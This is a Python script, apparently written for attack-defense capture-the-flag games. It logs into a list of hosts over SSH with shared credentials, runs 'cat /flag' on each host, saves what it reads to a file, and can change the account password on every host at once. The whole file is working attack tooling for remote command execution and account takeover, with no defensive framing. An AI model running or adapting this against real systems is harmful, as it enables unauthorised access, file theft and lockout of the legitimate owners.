import paramiko
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from paramiko_expect import SSHClientInteraction
from rich import print as rich_print
from typing import Tuple, Optional


class SSHConnectionTester:
    def __init__(
            self, port: int,
            username: str,
            password: Optional[str],
            ips_file: str = 'ips.txt',
            output_file: str = 'flags.txt',
            max_threads: int = 10
    ):
        self.ips_file = ips_file
        self.port = port
        self.username = username
        self.password = password
        self.output_file = output_file
        self.max_threads = max_threads

    def read_ips(self) -> list:
        with open(self.ips_file, 'r') as file:
            return [ip.strip() for ip in file.readlines()]

    def write_result(self, ip: str, result: Optional[str]):
        with open(self.output_file, 'a') as file:
            if result:
                file.write(f"[ssh][{datetime.now()}] {ip}:{self.port} {result}")

    def execute_command(self, ip: str, command: str) -> Tuple[
        str, Optional[str]]:
        client = paramiko.SSHClient()
        try:
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=self.port, username=self.username, password=self.password, timeout=1)
            stdin, stdout, stderr = client.exec_command(command)
            result = stdout.read().decode('utf-8')
            error = stderr.read().decode('utf-8')
            if error:
                rich_print(f"[bold red][-][ssh][{datetime.now()}]{ip}:{self.port} Error: {error}")
            else:
                rich_print(f"[bold green][+][ssh][{datetime.now()}]{ip}:{self.port} Response: {result}")
            return ip, result
        except Exception as e:
            rich_print(f"[!][ssh][{datetime.now()}]{ip}:{self.port} Connection failed: {e}")
            return ip, None
        finally:
            client.close()

    def test_all_ips(
            self, command: str = 'cat /flag',
    ):
        ips = self.read_ips()
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(self.execute_command, ip, command): ip for ip in ips}
            for future in futures:
                ip, result = future.result()
                self.write_result(ip, result)

    def _change_ssh_password(self, ip: str, new_password: str) -> bool:
        """
        修改SSH服务器上的用户密码。
        """
        client = paramiko.SSHClient()
        try:
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=self.port, username=self.username, password=self.password, timeout=10)
            with SSHClientInteraction(client, timeout=1, display=False) as interact:
                interact.send("passwd")
                if self.username != "root":
                    interact.expect('Current password:')
                    interact.send(self.password)
                interact.expect('New password:')
                interact.send(new_password)
                interact.expect('Retype new password:')
                interact.send(new_password)
                interact.expect()
                if interact.last_match is not None and 'updated successfully' in interact.current_output:
                    rich_print(f"[bold green][+][ssh][{datetime.now()}]{ip}:{self.port} 密码更改成功。")
                    return True
                else:
                    rich_print(f"[bold red][-][ssh][{datetime.now()}]{ip}:{self.port} 密码更改失败。")
                    return False
        except Exception as e:
            rich_print(f"[!][ssh][{datetime.now()}]{ip}:{self.port} 连接失败: {e}")
            return False
        finally:
            client.close()

    def change_passwords_in_bulk(self, new_password: str) -> None:
        """
        批量修改多个SSH服务器上的用户密码。
        """
        ips = self.read_ips()
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(self._change_ssh_password, ip, new_password) for ip in ips]
            for future in futures:
                future.result()
